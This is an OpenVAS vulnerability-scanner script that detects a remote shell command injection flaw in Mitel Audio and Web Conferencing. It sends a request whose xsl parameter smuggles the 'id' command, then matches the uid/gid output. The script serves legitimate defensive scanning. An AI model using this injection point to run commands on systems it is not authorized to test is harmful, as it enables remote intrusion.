###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_AWC_45537.nasl 12018 2018-10-22 13:31:29Z mmartin $
#
# Mitel Audio and Web Conferencing (AWC) Remote Arbitrary Shell Command Injection Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103010");
  script_version("$Revision: 12018 $");
  script_tag(name:"last_modification", value:"$Date: 2018-10-22 15:31:29 +0200 (Mon, 22 Oct 2018) $");
  script_tag(name:"creation_date", value:"2011-01-04 15:14:45 +0100 (Tue, 04 Jan 2011)");
  script_bugtraq_id(45537);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("Mitel Audio and Web Conferencing (AWC) Remote Arbitrary Shell Command Injection Vulnerability");

  script_xref(name:"URL", value:"https://www.securityfocus.com/bid/45537");
  script_xref(name:"URL", value:"http://www.mitel.com/DocController?documentId=26451");
  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/515403");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_tag(name:"solution", value:"The reporter indicates that updates are available. Symantec has not
confirmed this. Please see the references for details.");
  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"summary", value:"Mitel Audio and Web Conferencing (AWC) is prone to a remote
command-injection vulnerability because it fails to adequately
sanitize user-supplied input data.

Remote attackers can exploit this issue to execute arbitrary shell
commands with the privileges of the user running the application.");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
url = string("/awcuser/cgi-bin/vcs?xsl=/vcs/vcs_home.xsl%26id%26");

if(http_vuln_check(port:port, url:url,pattern:"uid=[0-9]+.*gid=[0-9]+.*")) {
  security_message(port:port);
  exit(0);
}

exit(0);
